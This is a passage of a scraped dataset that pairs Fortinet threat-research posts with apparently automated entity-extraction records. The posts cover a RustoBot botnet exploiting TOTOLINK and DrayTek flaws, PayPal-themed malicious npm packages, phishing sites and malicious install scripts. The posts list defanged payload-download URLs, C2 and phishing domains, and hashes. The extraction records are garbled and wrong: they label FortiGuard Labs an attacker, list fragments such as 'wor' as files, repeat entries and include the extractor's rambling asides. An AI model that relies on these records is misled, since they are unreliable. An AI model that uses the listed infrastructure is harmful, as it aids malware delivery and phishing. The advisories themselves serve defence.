IPS signature against attacks exploiting the following vulnerabilities: CVE-2022-26186: TOTOLINK.Devices.cstecgi.Command.InjectionCVE-2022-26187: TOTOLINK.Devices.cstecgi.Command.InjectionCVE-2022-26188: TOTOLINK.Devices.cstecgi.Command.InjectionCVE-2022-26189: TOTOLINK.Devices.cstecgi.Command.InjectionCVE-2022-26210: TOTOLINK.Devices.cstecgi.Command.InjectionCVE-2024-12987: DrayTek.Routers.apmcfgupload.Command.Injection We also suggest that organizations go through Fortinet’s free training module:Fortinet Certified Fundamentals (FCF)in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://66[.]63[.]187[.]69/w.shhxxp://66[.]63[.]187[.]69/wget.shhxxp://66[.]63[.]187[.]69/thxxp://66[.]63[.]187[.]69/tftp.shhxxp://66[.]63[.]187[.]69/arm5hxxp://66[.]63[.]187[.]69/arm6hxxp://66[.]63[.]187[.]69/arm7hxxp://66[.]63[.]187[.]69/mipshxxp://66[.]63[.]187[.]69/mpslhxxp://66[.]63[.]187[.]69/x86 dvrhelper[.]anondns[.]nettechsupport[.]anondns[.]netrustbot[.]anondns[.]netmiraisucks[.]anondns[.]net5[.]255[.]125[.]150 Downloader 76a487a46cfeb94eb5a6290ceffabb923c35befe71a1a3b7b7d67341a40bc45475d031e8faaf3aa0e9cafd5ef0fd7de1a2a80aaa245a9e92bae6433a17f48385fbdd5cba193a5e097cd12694efe14a15eb0fc059623f82da6c0bf99cbcfa22f80dde88e9e5a0670e19c3b3e864de1b6319aaf92989739602e55b494b09873fbe <RustoBot> 15c9d7a63fa419305d7f2710b63f71cc38178973c0ccf6d437ce8b6feeca4ee1427399864232c6c099f183704b23bff241c7e0de642e9eec66cc56890e8a63044f0ba25183ecb79a0721037a0ff9452fa8c19448f82943deca01b36555f2cc99c0abb19b3a72bd2785e8b567e82300423da672a463eefdeda6dd60872ff0e072dae8dae748be54ba0d5785ab27b1fdf42b7e66c48ab19177d4981bcc032cfb1c9f098920613bd0390d6485936256a67ae310b633124cfbf503936904e69a81bfe547306d6dee4b5b2b6ce3e989b9713a5c21ebe3fefa0f5c1a1ea37cec37e20fb910e77ee686d7d6769fab8cb8f9b17a4609c4e164bb4ed80d9717d9ddad364f44a526f20c592fd95b4f7d61974c6f87701e33776b68a5d0b44ccd2fa3f48c5defb0153047b08aa1876e1e4e97a082f6cb05af75479e1e9069b77d98473a11f49a9b5bdeb1f23736ceffba623c8950d627a791a0b40c4d44ae2f80e02a43955d5dc90cbb0f69f283ccf52a2a79b3dfe94ee8b3474cf6474cfcbe9f66f245a55db68e2d852ad157fc01da34e11aa24a5ab30845b706d7827b8119a3e648ce2cf19e660ce74e1bdb0a75293758200b03efd5f807e7896665addb684e0ffb53afd2ec9e77f1185f644462305184cf8afcf5d12c7eb524a2d3f4090a658a198c20ce114b460012412411363c9a3ab0246e48a584ce86fc6c0b7855495ec531dd05a11697fd5230f7f09a7b43fee1a1693013ed98beeb7a182cd3f0393d93dd1b7576 botnet FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (TOTOLINK N600R V4.3.0cu.7570_B20200620, File), (TOTOLINK A830R V5.9c.4729_B20191112, File), (A3100R V4.1.2cu.5050_B20200504, File), (A950RG V4.1.2cu.5161_B20200903, File), (A800R V4.1.2cu.5137_B20200730, File), (A3000RU V5.9c.5185_B20201128, File), (A810R V4.1.2cu.5182_B20201026, File), (cstecgi.cgifile, File), (RustoBot, Malware), (FortiGuard Labs, Attacker), (2025 Global Threat Landscape Report, File), (January and February of 2025, Time), (FortiGuard Labs, Organization), (Mozilla, Organization)\nRelationships: (RustoBot, target, TOTOLINK N6",
      "entities": [
        [
          "TOTOLINK N600R V4.3.0cu.7570_B20200620",
          "File"
        ],
        [
          "TOTOLINK A830R V5.9c.4729_B20191112",
          "File"
        ],
        [
          "A3100R V4.1.2cu.5050_B20200504",
          "File"
        ],
        [
          "A950RG V4.1.2cu.5161_B20200903",
          "File"
        ],
        [
          "A800R V4.1.2cu.5137_B20200730",
          "File"
        ],
        [
          "A3000RU V5.9c.5185_B20201128",
          "File"
        ],
        [
          "A810R V4.1.2cu.5182_B20201026",
          "File"
        ],
        [
          "cstecgi.cgifile",
          "File"
        ],
        [
          "RustoBot",
          "Malware"
        ],
        [
          "FortiGuard Labs",
          "Attacker"
        ],
        [
          "2025 Global Threat Landscape Report",
          "File"
        ],
        [
          "January and February of 2025",
          "Time"
        ],
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Mozilla",
          "Organization"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 14,
    "relationship_count": 0,
    "model": "Qwen3 4B",
    "index": 22
  },
  {
    "title": "Malicious NPM Packages Targeting PayPal Users",
    "link": "https://www.fortinet.com/blog/threat-research/malicious-npm-packages-targeting-paypal-users",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs’ AI-driven OSS malware detection system has recently discovered a series of malicious NPM packages designed to steal sensitive information from compromised systems. These packages are believed to have been created between March 5 and March 14 by a threat actor known astommyboy_h1andtommyboy_h2to targetPayPalusers. PayPal is a widely used platform holding sensitive financial information. Using PayPal-related names helps these malicious packages avoid detection, making it easier for attackers to steal sensitive information. By including \"PayPal\" in the name of the malicious packages, such asoauth2-paypalandbuttonfactoryserv-paypal, the attackers also create a false sense of legitimacy, tricking developers into installing them. The code collects and exfiltrates system data, such as usernames and directory paths, which can then be used to target PayPal accounts or be sold for fraudulent purposes. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The code has very similar characteristics, aiming to steal sensitive information and send it to remote servers. Users would lose their private info without knowing it. The preinstall hook runs a malicious script automatically before the package is installed, bypassing user or security tool detection. The script collects system data like the current user, working directory, and hostname, which helps the attacker understand the environment for further malicious actions. This information is then encoded into hexadecimal format and obfuscated by truncating and splitting directory paths to make it harder for security measures to detect. The obfuscated data is sent to an external server controlled by the attacker, with the dynamically generated URL making it more difficult to block. The sensitive data exfiltrated may be used in further attacks. The hacker published numerous malicious packages in a short time. These attacks function by using a \"preinstall hook\" in malicious NPM packages, automatically running a script when the package is installed. This script collects system information, like the user, hostname, and directory paths, and then sends it to an attacker-controlled server. To spot a compromise, look for unusual NPM packages with names like \"paypal\" (e.g., oauth2-paypal or buttonfactoryserv-paypal). Other signs include unexpected network connections to unknown servers, so also check your network logs for any suspicious activity. If you find any suspicious packages, remove them, change compromised credentials, and scan your system for further threats. Make sure your security software is up to date to detect such issues. The authors oftommyboy_h1andtommyboy_h2are likely the same person, publishing multiple malicious packages in a short time. We suspect that the same author created these packages to targetPayPalusers. We urge the public to be cautious when downloading packages and to ensure they are from trusted sources to avoid falling victim to such attacks. FortiGuard AntiVirusdetects the malicious files identified in this report as: bankingbundleserv_1.20.0: Bash/TommyBoy.A!trbuttonfactoryserv-paypal_3.50.0: Bash/TommyBoy.A!trbuttonfactoryserv-paypal_3.99.0:Bash/TommyBoy.A!trtommyboytesting_1.0.1:Bash/TommyBoy.A!trtommyboytesting_1.0.2:Bash/TommyBoy.A!trtommyboytesting_1.0.5:Bash/TommyBoy.A!trtommyboytesting_1.0.6:Bash/TommyBoy.A!trtommyboytesting_1.0.7:Bash/TommyBoy.A!trtommyboytesting_1.0.8:Bash/TommyBoy.A!trtommyboytesting_1.0.9:Bash/TommyBoy.A!trtommyboytesting_1.0.10:Bash/TommyBoy.A!trtommyboytesting_1.0.11:Bash/TommyBoy.A!trtommyboytesting_1.0.12:Bash/TommyBoy.A!trcompliancereadserv-paypal_2.1.0:Bash/TommyBoy.A!troauth2-paypal_0.6.0:Bash/TommyBoy.A!troauth2-paypal_1.6.0:Bash/TommyBoy.A!troauth2-paypal_2.6.0:Bash/TommyBoy.A!troauth2-paypal_4.8.0:Bash/TommyBoy.A!troauth2-paypal_7.5.0:Bash/TommyBoy.A!troauth2-paypal_10.0.0:Bash/TommyBoy.A!troauth2-paypal_699.0.0:Bash/TommyBoy.A!trPaymentapiplatformservice-paypal_1.20.0:Bash/TommyBoy.A!trUserbridge-paypal_1.20.0:Bash/TommyBoy.A!truserrelationship-paypal_1.20.0:Bash/TommyBoy.A!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. File Hash (sha256) Detection bankingbundleserv_1.20.0 796deae716a6d66b49a99d00e541056babe34fd2fcbcea0380491de4b792afba Bash/TommyBoy.A!tr buttonfactoryserv-paypal_3.50.0 18e45358462363996688ceabfc098e17f855d73842f460b34c683e58c728149f Bash/TommyBoy.A!tr buttonfactoryserv-paypal_3.99.0 88bd580aa51129e4e5fa69e148131874c862015e7c51d59497e11f22db2d72c6 Bash/TommyBoy.A!tr tommyboytesting_1.0.1 23664decf3c2f28a3f552dc98d90017926617969713ccccdc9f5fd3178d76dbf Bash/TommyBoy.A!tr tommyboytesting_1.0.2 ba63fbf6f7bab000bc1b1bf92319415328cea238872450adbaac6a6069132779 Bash/TommyBoy.A!tr tommyboytesting_1.0.5 f359b687fb9e1a4c27fdf5174380abc9877f940ef6a6fd4d38e9ef40bb778107 Bash/TommyBoy.A!tr tommyboytesting_1.0.6 815ebfc4fb5bddf1f9ca1b12ae2a1b0e37736a93ea9babe858747096ad9ce671 Bash/TommyBoy.A!tr tommyboytesting_1.0.7 d21ae84e104a305b5aebee8e6fbb4837976ef26935dac90372637f913ef58154 Bash/TommyBoy.A!tr tommyboytesting_1.0.8 0c006540abcb768cad80a1a8ced926fa58f10cf9eb0be16c4185850df83bff82 Bash/TommyBoy.A!tr tommyboytesting_1.0.9 847e684a228292dc905205d7353ed9458e10129105fe3b387c4e9374d6afd783 Bash/TommyBoy.A!tr tommyboytesting_1.0.10 ed6a350c4b1baa6f098293c328d0a62d35aafb4ab62b93e6f3a611f06be9aa29 Bash/TommyBoy.A!tr tommyboytesting_1.0.11 123480357ab54d2c2067640105b5683445777ae1d20fd52551a5df9327692103 Bash/TommyBoy.A!tr tommyboytesting_1.0.12 3710742057e470e8882a84412721ed19652e3f13977af21a937bad27d75b6f96 Bash/TommyBoy.A!tr compliancereadserv-paypal_2.1.0 dd1a177126d48072381db98af74c964100c8ef2e43286f3a31114461251a164c Bash/TommyBoy.A!tr oauth2-paypal_0.6.0 0d8c5bb69c567e3949cc6e087610d79c886d9140d0eda88cc92d3ec63fb7a3b9 Bash/TommyBoy.A!tr oauth2-paypal_1.6.0 b6bc001bc9b4171a27fb2a485cb3e3d8f23bc1ee6b4a03bbcfbba63b7d208477 Bash/TommyBoy.A!tr oauth2-paypal_2.6.0 2c7bf841a659fa1d8105d26f6664ebc3a78b99e0c071eb7f529503346c40f778 Bash/TommyBoy.A!tr oauth2-paypal_4.8.0 cbbe1d5a7d4a721c61b9c3b8b6a8e5d65508f02c70e708698d8165d92e154383 Bash/TommyBoy.A!tr oauth2-paypal_7.5.0 25034c2542757ac93cb6008479a5bfc594f9e92f66249f6fb862447a18847ba7 Bash/TommyBoy.A!tr oauth2-paypal_10.0.0 148d3552db2acf469c84e26889336f06167c6cf455248e08d703282bc0556fb8 Bash/TommyBoy.A!tr oauth2-paypal_699.0.0 7186674c208242b8e6fdf7b0f4e7539218590618fee517aa264e8446247d3440 Bash/TommyBoy.A!tr Paymentapiplatformservice-paypal_1.20.0 7a48db17a02e94c97a329cc1a578777d8b4fb74221bdb22202369d6590917fd0 Bash/TommyBoy.A!tr Userbridge-paypal_1.20.0 7a48db17a02e94c97a329cc1a578777d8b4fb74221bdb22202369d6590917fd0 Bash/TommyBoy.A!tr userrelationship-paypal_1.20.0 ca7dc2b0856f89e71ce9da6f179b34c8879456b5dffda0b5bd3f0fd73bab1c50 Bash/TommyBoy.A!tr Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (AI-driven OSS malware detection system, Tool), (malicious NPM packages, File), (tomyboy_h1, Attacker), (tommyboy_h2, Attacker), (PayPal, Organization), (oauth2-paypalandbuttonfactoryserv-paypal, File), (2025 Global Threat Landscape Report, Document), (remote servers, IP), (current user, File), (wor, File)\nRelationships: (FortiGuard Labs, uses, AI-driven OSS malware detection system), (AI-driven OSS malware detection system, discovered, malicious NPM packages), (tomyboy_h1, created, malicious NPM packages), (tomyboy_h1, targets, PayPal), (tomyboy_h2, created, malicious NPM packages), (tomyboy_h2, targets, PayPal), (malicious NPM packages, contains, oauth2-paypalandbuttonfactoryserv-paypal), (malicious NPM packages, exfiltrates, remote servers), (malicious NPM packages, targets, PayPal), (malicious NPM packages, contains, current user), (malicious NPM packages, contains, wor)\n```\n\nWait, but the example 4 shows that the relationship between the threat actor and the malware is \"uses\", but in the example 3, the threat actor is using the URL. So, the relationship types are not limited to the",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "AI-driven OSS malware detection system",
          "Tool"
        ],
        [
          "malicious NPM packages",
          "File"
        ],
        [
          "tomyboy_h1",
          "Attacker"
        ],
        [
          "tommyboy_h2",
          "Attacker"
        ],
        [
          "PayPal",
          "Organization"
        ],
        [
          "oauth2-paypalandbuttonfactoryserv-paypal",
          "File"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Document"
        ],
        [
          "remote servers",
          "IP"
        ],
        [
          "current user",
          "File"
        ],
        [
          "wor",
          "File"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "uses",
          "AI-driven OSS malware detection system"
        ],
        [
          "AI-driven OSS malware detection system",
          "discovered",
          "malicious NPM packages"
        ],
        [
          "tomyboy_h1",
          "created",
          "malicious NPM packages"
        ],
        [
          "tomyboy_h1",
          "targets",
          "PayPal"
        ],
        [
          "tomyboy_h2",
          "created",
          "malicious NPM packages"
        ],
        [
          "tomyboy_h2",
          "targets",
          "PayPal"
        ],
        [
          "malicious NPM packages",
          "contains",
          "oauth2-paypalandbuttonfactoryserv-paypal"
        ],
        [
          "malicious NPM packages",
          "exfiltrates",
          "remote servers"
        ],
        [
          "malicious NPM packages",
          "targets",
          "PayPal"
        ],
        [
          "malicious NPM packages",
          "contains",
          "current user"
        ],
        [
          "malicious NPM packages",
          "contains",
          "wor"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 11,
    "relationship_count": 11,
    "model": "Qwen3 4B",
    "index": 23
  },
  {
    "title": "Real-Time Anti-Phishing: Essential Defense Against Evolving Cyber Threats",
    "link": "https://www.fortinet.com/blog/threat-research/real-time-anti-phishing-essential-defense-against-evolving-cyber-threats",
    "content": "FortiGuard Labs Threat Research Phishing remains one of the most prevalent cybersecurity threats worldwide, posing risks such as financial loss, data theft, reputational harm, and malware deployment. As phishing tactics grow more sophisticated, attackers are also expanding their targets across various platforms and services. The use of AI has further refined these techniques, making phishing attempts more deceptive and harder to detect. Attackers increasingly use personalized messages and convincing fake websites to evade traditional security measures, making detection more difficult for security teams. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Organizations must strengthen their defenses to keep pace with the rapidly evolving threat landscape. While traditional defenses like email filters and blacklists can block known threats, they are less effective against emerging and AI-driven phishing attacks. Real-time anti-phishing (RTAP) solutions help address this challenge by using AI and machine learning to identify and mitigate both large-scale phishing campaigns and highly targeted spear-phishing attacks as they occur. According to the 2024 Verizon DBIR report, the median time for a user to fall prey to a phishing email is less than 60 seconds.[1] Over the past several weeks, threat data gathered by FortiGuard Labs reveals critical insights into the nature of phishing campaigns and the primary targets. These insights provide a snapshot of how cybercriminals are evolving their tactics to reach unsuspecting users. 1. Facebook is a Consistent Target: Our recent monitoring of phishing attacks has shown Facebook to a top target for phishing emails. Its widespread use and abundant personal information associated with accounts make it appealing to cybercriminals seeking to steal login credentials or exploit user data. Many phishing websites attempt to deceive users by claiming their account has been disabled or requires verification. 2. Roblox Targeting: In mid-February, a spike in phishing attempts targeted Roblox, a popular gaming platform among younger users. Phishing emails appeared disguised as account alerts or prize notifications, prompting victims to click on malicious links or provide sensitive or personal details. 3. Broad Targeting the End of January: The final days of January saw a broad range of platforms targeted by phishing attempts. These included: oTelegram:A widely used and encrypted messaging app.oIonos:A Germany-based email, hosting, and cloud services provider.oCoinbase:A popular cryptocurrency exchange.oPayPal:A worldwide used online payment system.oLazada:An e-commerce platform operating primarily in Southeast Asia.oiTrust:A cryptocurrency platform.oVkontakte:A Russian social media platform. FortiGuard Labs provides an advanced RTAP service as part of our FortiSandbox Advanced AI Subscription Bundle. This service provides comprehensive and proactive protection against phishing emails and other cyber threats. The RTAP solution built into FortiSandbox uses a variety of techniques to identify and block phishing emails, including: RTAP from FortiGuard Labs ensures that even previously unseen and unknown phishing attempts—which may not be recognized by traditional security systems—are detected and blocked. Human error remains one of the primary reasons phishing attacks succeed, making employee awareness and education essential for defense. Training staff to recognize and report phishing attempts can significantly reduce an organization’s risk. A well-informed workforce serves as the first line of defense against today’s increasingly sophisticated phishing tactics. The 2024 Verizon DBIR highlights this challenge, revealing that 68% of all breaches involved a non-malicious human factor—either through social engineering or unintentional mistakes.[1] Fortinet’sFortiPhishandFortiSATempower organizations to strengthen their human firewall. FortiPhish provides phishing simulation and awareness training, while FortiSAT provides critical security awareness training to create a cyber-aware workforce. Implementing these proactive training tools will enhance employee awareness, bolster technical defenses, and reduce the risk of successful phishing attacks. As phishing attacks grow more sophisticated, real-time, adaptive cybersecurity solutions are crucial for effective defense. FortiGuard’s advanced anti-phishing capabilities, powered by AI and machine learning, provide continuous protection by detecting and neutralizing new phishing techniques as they emerge. With RTAP’s real-time threat response, FortiGuard helps businesses and individuals safeguard their digital environments to reduce risk and stay ahead of cybercriminals. [facebook]case-id-10012125556[.]vercel[.]apppolicy-violation-10002321704[.]github[.]io [roblox]robux-generator---cpa[.]firebaseapp[.]comrbxodi[.]blogspot[.]com [telegram]www[.]telegramtgtg[.]comwww[.]91gsh[.]com [ionos]67a34b6bfc0d210a820d0cf5--brilliant-mermaid-bad0bd[.]netlify[.]appgworldhomes[.]com/ionos-ag/ionos-es/login/login[.]php [coinbase]000414-coinbase[.]comcoinbsphnnumbe[.]gitbook[.]io/us [paypal]paypalloginonline[.]blogspot[.]comniemalssoeder[.]de/c/index/myaccount [vkontakte]uncloabatles[.]ru/votes/7838610vim[.]vimeo18[.]ru/votes/3818905 [1]https://www.verizon.com/business/resources/infographics/2024-dbir-infographic.pdf phishing FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (Phishing, Threat Type), (AI, Technique), (email filters, Tool), (blacklists, Tool), (Real-time anti-phishing (RTAP), Threat Type), (Verizon DBIR report, Tool), (2025 Global Threat Landscape Report, Tool)\nRelationships: (Phishing, associated with, AI), (Phishing, associated with, email filters), (Phishing, associated with, blacklists), (Phishing, associated with, Real-time anti-phishing (RTAP)), (Phishing, associated with, Verizon DBIR report), (Phishing, associated with, 2025 Global Threat Landscape Report)\nAnswer:\n\nNamed Entities: (Phishing, Threat Type), (AI, Technique), (email filters, Tool), (blacklists, Tool), (Real-time anti-phishing (RTAP), Threat Type), (Verizon DBIR report, Tool), (2025 Global Threat Landscape Report, Tool)\nRelationships: (Phishing, associated with, AI), (Phishing, associated with, email filters), (Phishing, associated with, blacklists), (Phishing, associated with, Real-time anti-phishing (RTAP)), (Phishing, associated with, Verizon DBIR report), (Phishing, associated with, 2025 Global Threat Landscape Report) \n\nWait, but the example 4 shows that \"H2Miner\" is a Threat Type,",
      "entities": [
        [
          "Phishing",
          "Threat Type"
        ],
        [
          "AI",
          "Technique"
        ],
        [
          "email filters",
          "Tool"
        ],
        [
          "blacklists",
          "Tool"
        ],
        [
          "Verizon DBIR report",
          "Tool"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Tool"
        ],
        [
          "Phishing",
          "Threat Type"
        ],
        [
          "AI",
          "Technique"
        ],
        [
          "email filters",
          "Tool"
        ],
        [
          "blacklists",
          "Tool"
        ],
        [
          "Verizon DBIR report",
          "Tool"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Tool"
        ]
      ],
      "relationships": [
        [
          "Phishing",
          "associated with",
          "AI"
        ],
        [
          "Phishing",
          "associated with",
          "email filters"
        ],
        [
          "Phishing",
          "associated with",
          "blacklists"
        ],
        [
          "Phishing",
          "associated with",
          "Real-time anti-phishing (RTAP"
        ],
        [
          "Phishing",
          "associated with",
          "Verizon DBIR report"
        ],
        [
          "Phishing",
          "associated with",
          "2025 Global Threat Landscape Report"
        ],
        [
          "Phishing",
          "associated with",
          "AI"
        ],
        [
          "Phishing",
          "associated with",
          "email filters"
        ],
        [
          "Phishing",
          "associated with",
          "blacklists"
        ],
        [
          "Phishing",
          "associated with",
          "Real-time anti-phishing (RTAP"
        ],
        [
          "Phishing",
          "associated with",
          "Verizon DBIR report"
        ],
        [
          "Phishing",
          "associated with",
          "2025 Global Threat Landscape Report"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 12,
    "relationship_count": 12,
    "model": "Qwen3 4B",
    "index": 24
  },
  {
    "title": "Fortinet Identifies Malicious Packages in the Wild: Insights and Trends from November 2024 Onward",
    "link": "https://www.fortinet.com/blog/threat-research/fortinet-identifies-malicious-packages-in-the-wild-insights-and-trends",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs has analyzed malicious software packages detected from November 2024 to the present, identifying various techniques used to exploit system vulnerabilities. This analysis provides insights into the evolving threat landscape and emerging attack methods. FortiGuard Labs leverages our proprietary, AI-driven OSS malware detection system to track and examine these threats. By reviewing the tactics observed—such as low-file-count packages designed to evade detection, command overwrite techniques, and typosquatting—this report outlines key trends and their potential impact on system security. Since November 2024, Fortinet's automated threat detection platform has identified multiple malicious software packages, revealing various attack techniques used to exploit system vulnerabilities. These analyses show that attackers are employing methods such as obfuscation and install scripts to bypass traditional security measures. This report provides an overview of the identified threats and the techniques observed, reinforcing the importance of robust detection and security strategies in software environments. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. FortiGuard Labs' analysis has identified a range of techniques used by attackers to compromise systems, including both well-known and less common methods: While not necessarily malicious on its own,the majority of detected malicious packages (1,082) exhibit a low file count, often containing minimal code designed to evade detection while enabling exploits such as data theft, unauthorized access, or system compromise. Common indicators include command overwrites, where attackers modify installation commands to introduce malicious code or bypass security, suspicious behavior flagged by machine learning systems due to anomalous patterns, and obfuscation techniques like base64 encoding or encryption to conceal harmful payloads. These tactics combine to create lightweight, evasive threats that are challenging to detect but capable of significant damage. While not all install scripts are malicious, threat actors often use them to silently deploy harmful code during installation, sometimes bypassing security checks.These scripts can modify the standard installation process to execute harmful actions without the user’s knowledge. For example, an install script may include HTTP POST requests for data exfiltration, suspicious API calls like https.get or https.request to communicate with external servers, and hardcoded URLs, such as Discord webhooks, for receiving stolen data. These actions suggest the script is setting up a backdoor or preparing the system for further malicious activities, highlighting the need for careful scrutiny of installation scripts to detect and mitigate potential threats. Packages lacking a repository URL raise concerns about their legitimacy and transparency, as they often lack clear provenance or accountability, which is typical of malicious software. Without a public repository, verifying the source, tracking development, or assessing potential security issues is difficult. Malicious actors may avoid repositories to evade scrutiny and prevent code inspection, reducing the chances of detection. A missing repository URL, combined with other red flags like suspicious APIs or URLs, increases the likelihood that the package is designed for exploitation, data theft, or other malicious activities. Suspicious URLs are a key indicator of potentially malicious packages, as they are often used to download additional payloads or establish communication with command-and-control (C&C) servers, giving attackers control over infected systems. These URLs may appear legitimate, disguising their harmful intent to evade detection. Common tactics include using shortened or dynamic URLs, hosting malicious content on trusted platforms, or disguising payloads as safe files. In 974 packages, such URLs are linked to the risk of data exfiltration, further malware downloads, and other malicious actions. It is crucial to scrutinize and monitor external URLs in package dependencies to prevent exploitation. While essential for software functionality, APIs can be weaponized by malicious actors to perform harmful activities. In 681 detected cases, suspicious APIs like https.get and https.request were used to exfiltrate data, enable command-and-control (C&C) communication, or obscure malicious intent. These APIs may send sensitive information to remote servers or allow remote control of compromised systems. In one example, the use of https.get and https.request in index.js suggests data exfiltration or communication with external sources, a common tactic in malware. Combined with other red flags, such as suspicious URLs, these API calls indicate the potential for malicious or compromised projects. Recently discovered malicious Python packages AffineQuant-99.6, amzn-aws-glue-ml-libs-python-6.1.5, and amzn-awsglue-6.1.4, exploit the setup.py file to silently collect system information, including the MAC address, hostname, username, and current directory, and sends this data to remote servers controlled by the attacker. The script uses system commands (getmac for Windows, ifconfig for Linux/macOS) to retrieve the MAC address, base64-encoded it, and send it to hidden URLs. A custom installation process using setuptools to override the installation routine ensures the malicious payload runs after the package is installed. This type of attack has been identified in multiple packages and highlights the risk developers face when installing packages from untrusted sources—potentially leading to stolen credentials, system data, and further attacks. To protect themselves, developers should install packages only from trusted sources, review package content before installation, use virtual environments to isolate installs, scan for vulnerabilities with security tools, and keep dependencies up to date. A malicious script (seller-admin-common_6.5.8, seller-rn-mng-lib_6.5.8. ) is designed to secretly collect sensitive information from a victim’s machine and send it to an external server via a Discord webhook. Upon execution, the script retrieves the internal IP address of the victim’s machine and fetches the external IP address by making an HTTPS request to an online API. It also gathers system details, such as the hostname, username, DNS servers, home directory, and application information. This collected data is then bundled into a JSON object and sent to the attacker’s server, where it can be accessed for further malicious purposes. The combination of internal and external IP addresses, DNS settings, and user details makes the attack highly invasive, enabling attackers to track the victim’s machine and potentially exploit the information for further attacks. Using a Discord webhook adds a layer of stealth, allowing the attacker to collect the stolen data without raising suspicion, making this type of data harvesting ideal for gathering intelligence or executing more targeted cyberattacks. A recently identified malicious JavaScript code found in the package xeno.dll_1.0.2 utilizes obfuscation techniques to disguise its true intentions. Upon installation, it logs keystrokes to capture private information such as passwords and credit card details, which are then encrypted and sent to a remote server controlled by the attacker. Additionally, the script installs a backdoor that provides remote access with elevated privileges, giving the attacker full control of the system. The backdoor also collects system-specific data, such as the operating system version, installed applications, and network configuration, and sends it to the attacker’s server for future exploitation. Disguised as a legitimate service, the attacker’s server makes the malicious activity harder to detect. This stealthy combination of keylogging and remote access allows the attacker to steal sensitive data and conduct further attacks, posing a significant threat to the victim's privacy and system integrity. The data from FortiGuard Labs’ analysis reveals a diverse array of malicious packages, showcasing the wide range of tactics used by cybercriminals. From simple low-file-count packages to complex, multi-layered attacks that involve combining files, network code, and process execution, attackers are leveraging increasingly sophisticated methods to breach systems. As cybersecurity threats evolve, it’s crucial for organizations and individuals to stay informed about the latest threats. Proactive defense measures such as regular system updates, advanced threat detection, and user education on identifying suspicious activity are essential in mitigating these growing risks. Stay vigilant and protect your systems from these emerging threats. FortiGuard AntiVirusdetects the malicious files identified in this report as: AffineQuant-99.6/main.py : Python/Agent.EBC2!traffineQuant-99.6: Python/Agent.EBC2!tramzn-aws-glue-ml-libs-python-6.1.5/setup.py: Python/Agent.D31D!tramzn-aws-glue-ml-libs-python-6.1.5:Python/Agent.D31D!tramzn-awsglue-6.1.4/setup.py: Python/Agent.8960!trAmzn-awsglue-6.1.4: Python/Agent.8960!trseller-admin-common_6.5.8/index.js: JS/Agent.409D!trSeller-admin-common_6.5.8: JS/Agent.409D!trseller-rn-mng-lib_6.5.8/index.js: JS/Agent.409D!trSeller-rn-mng-lib_6.5.8: JS/Agent.409D!trxeno.dll_1.0.2/index.js: JS/Agent.B3EF!trXeno.dll_1.0.2: JS/Agent.B3EF!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Package/file name Sha256 Detection affineQuant-99.6/main.py a7ba9a1eef84ae8dad8ed328c41fe4346df402a003ff7cef5e7cbd592c29f4de Python/Agent.EBC2!tr affineQuant-99.6 8fe3eee65782c61111354a0a2a58da04901c7b416d3b7634aa605e1939dde531 Python/Agent.EBC2!tr amzn-aws-glue-ml-libs-python-6.1.5/setup.py 2420fa98a183da4153e4de00e401efa19c62fe9ed631d980315b0b719221aec4 Python/Agent.D31D!tr amzn-aws-glue-ml-libs-python-6.1.5 05e9226714f29fbe526820d35c8011f86297444ec581d16d60b38bb55b20fa91 Python/Agent.D31D!tr amzn-awsglue-6.1.4/setup.py ba0ac1985fb931110899402ce44f11c5d75161cb69ff3d0e9357000ef631a2e1 Python/Agent.8960!tr amzn-awsglue-6.1.4 351bd6e977884f050bdb348239cfd20e0cc9b9a7a6aa3b3aa21e3bed0b072afe Python/Agent.8960!tr seller-admin-common_6.5.8/index.js 3fe14fc83121fdc05efdcc0c1c4d532ca501644a952399b27a6e1bdd6cfed2b7 JS/Agent.409D!tr seller-admin-common_6.5.8 3fe14fc83121fdc05efdcc0c1c4d532ca501644a952399b27a6e1bdd6cfed2b7 JS/Agent.409D!tr seller-rn-mng-lib_6.5.8/index.js 